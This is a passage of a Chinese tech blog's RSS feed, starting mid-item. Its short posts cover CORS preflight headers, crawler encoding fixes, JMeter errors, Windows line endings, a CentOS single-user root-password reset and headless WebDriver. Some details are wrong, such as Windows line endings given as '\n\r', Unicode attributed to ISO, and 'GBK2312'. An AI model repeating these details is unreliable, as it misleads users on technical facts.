Content-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip&lt;/span&gt;
Content-Length&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
Keep-Alive&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;timeout=2, max=100&lt;/span&gt;
Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Keep-Alive&lt;/span&gt;
Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;text/plain&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示 【api.bob.com】 可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;OK&lt;/span&gt;
Access-Control-Allow-Origin&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果服务器否定了&amp;quot;预检&amp;quot;请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HTTP/1.1 200 OK
XMLHttpRequest cannot load http://api.alice.com.
Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;服务器回应的其他CORS相关字段如下。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;OK&lt;/span&gt;
Access-Control-Allow-Methods&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;GET, POST, PUT&lt;/span&gt;
Access-Control-Allow-Headers&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;X-Custom-Header&lt;/span&gt;
Access-Control-Allow-Credentials&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;true&lt;/span&gt;
Access-Control-Max-Age&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1728000&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Access-Control-Allow-Methods&lt;/strong&gt;：该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次&amp;quot;预检&amp;quot;请求。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Access-Control-Allow-Headers&lt;/strong&gt;：如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在&amp;quot;预检&amp;quot;中请求的字段。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Access-Control-Allow-Credentials&lt;/strong&gt;：该字段与简单请求时的含义相同。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Access-Control-Max-Age&lt;/strong&gt;：该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一旦服务器通过了&amp;quot;预检&amp;quot;请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。&lt;/p&gt;
&lt;p&gt;下面是&amp;quot;预检&amp;quot;请求之后，浏览器的正常CORS请求。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PUT&lt;/span&gt; /cors &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
Origin&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;http://api.bob.com&lt;/span&gt;
Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;api.alice.com&lt;/span&gt;
X-Custom-Header&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;value&lt;/span&gt;
Accept-Language&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;en-US&lt;/span&gt;
Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;keep-alive&lt;/span&gt;
User-Agent&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Mozilla/5.0...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面头信息的&lt;code&gt;Origin&lt;/code&gt;字段是浏览器自动添加的。下面是服务器正常的回应。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;OK&lt;/span&gt;
Access-Control-Allow-Origin&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;http://api.bob.com&lt;/span&gt;
Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;text/html; charset=utf-8&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面头信息中，Access-Control-Allow-Origin字段是每次回应都必定包含的。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>BUG—爬虫中乱码的成因及处理</title>
        <link>https://ac-lm.github.io/posts/bug/bug%E7%88%AC%E8%99%AB%E4%B8%AD%E4%B9%B1%E7%A0%81%E7%9A%84%E6%88%90%E5%9B%A0%E5%8F%8A%E5%A4%84%E7%90%86/</link>
        <pubDate>Sun, 29 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/bug%E7%88%AC%E8%99%AB%E4%B8%AD%E4%B9%B1%E7%A0%81%E7%9A%84%E6%88%90%E5%9B%A0%E5%8F%8A%E5%A4%84%E7%90%86/</guid>
        <description>&lt;h2 id=&#34;为什么会出现乱码&#34;&gt;为什么会出现乱码&lt;/h2&gt;
&lt;p&gt;在使用 Python 爬虫时，有些网站获取的数据会出现乱码，这是由于 Requests 模块会基于 HTTP 头对响应的编码作出有根据的推测。当获取到响应结果的文本(text属性)后，Requests 会使用其推测的文本进行编码。当编码出现错误时，就会出现乱码。此时我们可以使用以下这两个方法查看响应文本的编解码类型。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;print(res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encoding) 
&lt;span style=&#34;color:#75715e&#34;&gt;# 查看网页返回的字符集类型，其值是从 header 中的 charset 字段中提取的编码方式，若 header 中没有 charset 字段则默认为 ISO-8859-1 编码模式，是默认使用的编码格式&lt;/span&gt;
print(res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;apparent_encoding) 
&lt;span style=&#34;color:#75715e&#34;&gt;# 自动判断字符集类型，apparent_encoding 会从网页的内容中分析网页编码的方式，所以 apparent_encoding 比 encoding 更加准确。当网页出现乱码时可以把 apparent_encoding 的编码格式赋值给 encoding。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Python 使用的编解码格式&lt;/span&gt;
ISO&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8859&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 实际应该使用的编解码格式&lt;/span&gt;
GB2312
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以发现 Requests 推测的文本编码 ISO 与源网页编码 GBK 不一致&lt;/p&gt;
&lt;h2 id=&#34;乱码怎么出现的&#34;&gt;乱码怎么出现的&lt;/h2&gt;
&lt;p&gt;当源网页编码和爬取下来后的编码转换不一致时，程序就会出现乱码。比如源网页为 GBK 编码的字节流，在我们抓取后，程序直接使用 UTF-8 进行编码并输出到文件中，此时必然会引起乱码。&lt;/p&gt;
&lt;p&gt;现如今主流的编码有：Unicode、ISO-8859-1、GBK2312、GBK、UTF-8 等几种。&lt;/p&gt;
&lt;p&gt;最早的编码是 ISO-8859-1，和 ASCII 编码相似。ISO-8859-1 属于单字节编码，最多能表示的字符范围是 0-255，应用于英文环境。很明显，ISO-8859-1 编码表示的字符范围很窄，无法表示中文字符。&lt;/p&gt;
&lt;p&gt;1981年中国人民通过对 ASCII 编码的中文扩充改造，产生了 GBK2312 编码，可以表示 6000 多个常用汉字。但汉字实在是太多了，包括繁体和各种字符，于是产生了 GBK 编码，它包括了 GBK2312 中的编码，同时扩充了很多。&lt;/p&gt;
&lt;p&gt;随着时代的发展，其他国家都像中国一样，把自己的语言进行了编码，出现了很多的编码格式。终于，有个叫 ISO 的组织看不下去了。他们创造了一种编码 Unicode，这种编码非常大，大到可以容纳世界上任何一个文字和标志。只要电脑上有 Unicode 这种编码系统，无论是全球哪种文字，只要是 Unicode 编码都可以被其他电脑正常解释。Unicode 在网络传输中，出现了两个标准 UTF-8 和 UTF-16，分别每次传输 8 个位和 16 个位。但与之带来的问题是 UTF-8 等编码体积比较大，占电脑空间比较多，因此如果面向的使用人群绝大多是中国人的话，用 GBK 编码便可以了。&lt;/p&gt;
&lt;h2 id=&#34;什么是编码&#34;&gt;什么是编码&lt;/h2&gt;
&lt;p&gt;可以这样来理解：字符串是由字符构成，字符在计算机硬件中通过二进制形式存储，这种二进制形式就是编码。如果直接使用&lt;code&gt;字符串&amp;gt;字符&amp;gt;二进制表示（编码）&lt;/code&gt;，会增加不同类型编码之间转换的复杂性。所以引入了一个抽象层&lt;code&gt;字符串&amp;gt;字符&amp;gt;与存储无关的表示&amp;gt;二进制表示（编码）&lt;/code&gt;，这样，可以用一种与存储无关的形式表示字符，不同的编码之间转换时可以先转换到这个抽象层，然后再转换为其他编码形式。在这里，Unicode 就是与存储无关的表示，UTF-8 就是二进制表示。&lt;/p&gt;
&lt;h2 id=&#34;如何解决乱码&#34;&gt;如何解决乱码&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;直接指定 &lt;code&gt;res.encoding&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://search.51job.com&amp;#34;&lt;/span&gt;
res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url)
res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encoding &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GBK&amp;#34;&lt;/span&gt;
html &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text
print(html)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过 &lt;code&gt;res.apparent_encoding&lt;/code&gt; 属性指定&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://search.51job.com&amp;#34;&lt;/span&gt;
res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url)
res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encoding &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;apparent_encoding
html &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text
print(html)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过编码、解码的方式&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://search.51job.com&amp;#34;&lt;/span&gt;
res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url)
html &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ISO-8859-1&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GBK&amp;#39;&lt;/span&gt;)
print(html)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>BUG—Jmeter 相关问题</title>
        <link>https://ac-lm.github.io/posts/bug/bugjmeter-%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</link>
        <pubDate>Sat, 28 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/bugjmeter-%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</guid>
        <description>&lt;h2 id=&#34;bug-描述&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;运行内存配置修改&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; not defined HEAP &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
    rem See the unix startup file &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the rationale of the following parameters,
    rem including some tuning recommendations
    set HEAP&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;-Xms5g -Xmx5g -XX:MaxMetaspaceSize&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;5120m
&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;修改 &lt;code&gt;bat&lt;/code&gt; 文件中 &lt;code&gt;HEAP&lt;/code&gt; 值。&lt;code&gt;HEAP=-Xms**5g** -Xmx**5g**&lt;/code&gt;，最小与最大运行内存。&lt;code&gt;MaxMetaspaceSize&lt;/code&gt;，最大堆栈 。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;bug-描述-1&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;端口被突然关闭 &lt;code&gt;socket closed&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;resolution-1&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;原因：发送请求时，Jmeter 一般默认选择 &lt;code&gt;Use KeepAlive&lt;/code&gt;，即保持连接协议，但由于 &lt;code&gt;JMeter.properties&lt;/code&gt; 中时间设置默认注销，即不会等待，因此一旦连接空闲，就会断开，从而导致报错&lt;/p&gt;
&lt;p&gt;解决：修改 &lt;code&gt;httpclient4.idletimeout=&amp;lt;time in ms&amp;gt;&lt;/code&gt; ，一般可设置成 &lt;code&gt;1000-6000ms&lt;/code&gt;（表示连接空闲10s后才会断开）。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;bug-描述-2&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;地址被占用 &lt;code&gt;address already in use:connect&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;错误：&lt;code&gt;java.net.BindException: Address already in use: connect&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;resolution-2&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;原因：Windows 端口被耗尽（默认1024-5000），且短时间内这些端口不会释放，Windows 端口最大数为 65534&lt;/p&gt;
&lt;p&gt;解决：修改操作系统注册表(&lt;code&gt;cmd &amp;gt; regedit&lt;/code&gt;)，找到 &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TCPIP\Parameters&lt;/code&gt; ，新建两个 &lt;code&gt;DWORD&lt;/code&gt; 值，&lt;code&gt;{MaxUserPort：65534, TcpTimedWaitDelay：30}&lt;/code&gt;，重启系统。&lt;/p&gt;
&lt;p&gt;【或设置线程组时，勾选 &lt;code&gt;same user on each iteration&lt;/code&gt;】&lt;/p&gt;
&lt;p&gt;【或不勾选 &lt;code&gt;Use KeepAlive&lt;/code&gt;】&lt;/p&gt;
</description>
        </item>
        <item>
        <title>BUG—Windows 的脚本无法在 Linux 运行</title>
        <link>https://ac-lm.github.io/posts/bug/bugwindows-%E7%9A%84%E8%84%9A%E6%9C%AC%E6%97%A0%E6%B3%95%E5%9C%A8-linux-%E8%BF%90%E8%A1%8C/</link>
        <pubDate>Fri, 27 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/bugwindows-%E7%9A%84%E8%84%9A%E6%9C%AC%E6%97%A0%E6%B3%95%E5%9C%A8-linux-%E8%BF%90%E8%A1%8C/</guid>
        <description>&lt;h2 id=&#34;bug-描述&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;Windows 下使用记事本编写的 shell 脚本，在上传到 Linux 系统后，无法运行，结果返回错误。&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;这是由于 Windows 系统编码与 Linux 系统编码不同导致的，Windows 系统编码中回车会编码成 &lt;code&gt;\n\r&lt;/code&gt;，而 Linux 系统中回车则是 &lt;code&gt;\n&lt;/code&gt;，正因如此，Windows 下编写的 shell 脚本无法在 Linux 下运行。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>BUG—Linux 修改密码</title>
        <link>https://ac-lm.github.io/posts/bug/buglinux-%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/</link>
        <pubDate>Thu, 26 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/buglinux-%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/</guid>
        <description>&lt;h2 id=&#34;bug-描述&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;CentOS7 进入单用户模式修改密码&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;在选择系统界面，按 &lt;code&gt;E&lt;/code&gt; 进入启动配置，定位到命令 &lt;code&gt;Ro&lt;/code&gt; ，将其改为 &lt;code&gt;rw init=/sysroot/bin/sh&lt;/code&gt;，&lt;code&gt;Ctrl+X&lt;/code&gt;进行重启，进入单用户模式，执行&lt;code&gt;chroot /sysroot&lt;/code&gt;进入系统目录，输入&lt;code&gt;passwd root&lt;/code&gt;修改密码，&lt;code&gt;touch /.autorelabel&lt;/code&gt;执行修改&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Net—JMeter 在 Linux 中的搭建</title>
        <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netjmeter-%E5%9C%A8-linux-%E4%B8%AD%E7%9A%84%E6%90%AD%E5%BB%BA-/</link>
        <pubDate>Thu, 26 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netjmeter-%E5%9C%A8-linux-%E4%B8%AD%E7%9A%84%E6%90%AD%E5%BB%BA-/</guid>
        <description>&lt;h2 id=&#34;1linux下的jmeter&#34;&gt;1.Linux下的Jmeter&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://jmeter.apache.org/download_jmeter.cgi&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Jmeter 官网下载 &lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;tar -xvf Jmeter.tgz
&lt;span style=&#34;color:#75715e&#34;&gt;# 注意需配置Java环境&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2配置jmeter环境&#34;&gt;2.配置Jmeter环境&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vi /etc/profile &lt;span style=&#34;color:#75715e&#34;&gt;#编辑环境&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#----------------------------------------#&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#Jmeter environment&lt;/span&gt;
export JMETER_HOME&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/root/Jmeter
export PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$PATH:&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;JMETER_HOME&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;/bin
&lt;span style=&#34;color:#75715e&#34;&gt;#######&lt;/span&gt;
source /etc/profile &lt;span style=&#34;color:#75715e&#34;&gt;#启动环境&lt;/span&gt;
jmeter -v &lt;span style=&#34;color:#75715e&#34;&gt;#检查是否成功运行&lt;/span&gt;
jmeter –n –t test.jmx –l test.jtl &lt;span style=&#34;color:#75715e&#34;&gt;#执行jmeter脚本&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3jmeter命令参数&#34;&gt;3.jmeter命令参数&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;-h 帮助 -&amp;gt; 打印出有用的信息并退出
-n 非 GUI 模式 -&amp;gt; 在非 GUI 模式下运行 JMeter
-t 测试文件 -&amp;gt; 要运行的 JMeter 测试脚本文件
-l 日志文件 -&amp;gt; 记录结果的文件
-r 远程执行 -&amp;gt; 启动远程服务
-H 代理主机 -&amp;gt; 设置 JMeter 使用的代理主机
-P 代理端口 -&amp;gt; 设置 JMeter 使用的代理主机的端口号
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>BUG—无头浏览器导致的元素不可见</title>
        <link>https://ac-lm.github.io/posts/bug/bug%E6%97%A0%E5%A4%B4%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%BC%E8%87%B4%E7%9A%84%E5%85%83%E7%B4%A0%E4%B8%8D%E5%8F%AF%E8%A7%81/</link>
        <pubDate>Wed, 25 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/bug%E6%97%A0%E5%A4%B4%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%BC%E8%87%B4%E7%9A%84%E5%85%83%E7%B4%A0%E4%B8%8D%E5%8F%AF%E8%A7%81/</guid>
        <description>&lt;h2 id=&#34;bug-描述&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;WebDriver 在使用 headless 时，默认会将窗口设置为 &lt;strong&gt;0x0&lt;/strong&gt;，并且处于 &lt;strong&gt;Minimized&lt;/strong&gt; 状态。这样会导致程序启动后，部分元素由于没有打印而无法被点击的异常&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;在启动 WebDriver 时先配置浏览器大小&lt;/p&gt;
